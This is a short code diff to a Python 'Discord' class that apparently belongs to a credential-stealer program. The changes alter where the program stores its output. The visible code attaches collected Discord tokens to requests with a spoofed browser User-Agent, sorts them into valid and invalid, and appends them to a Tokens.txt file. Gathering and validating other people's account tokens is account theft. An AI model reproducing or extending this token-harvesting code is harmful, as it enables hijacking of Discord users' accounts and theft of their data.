@@ -17,7 +17,7 @@ class Discord:
 
     def __create_folder(self):
 
-        folder = rf"{self.storage_path}\{self.storage_folder}\{self.folder}\Discord"
+        folder = rf"{self.storage_path}\{self.folder}"
 
         if not path.exists(folder):
             makedirs(folder)
@@ -34,6 +34,7 @@ class Discord:
             "Content-Type": content_type,
             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
         }
+
         if token is not None:
             headers.update({"Authorization": token})
 
@@ -62,7 +63,7 @@ class Discord:
             except:
                 invalid.append(token)
 
-        with open(rf"{self.storage_path}\{self.storage_folder}\{self.folder}\Discord\Tokens.txt", "a", encoding="utf-8") as discord:
+        with open(rf"{self.storage_path}\{self.folder}\Tokens.txt", "a", encoding="utf-8") as discord:
 
             discord.write("Invalid tokens:\n" + "\n".join(item for item in invalid) + "\n\nValid tokens:\n")
 
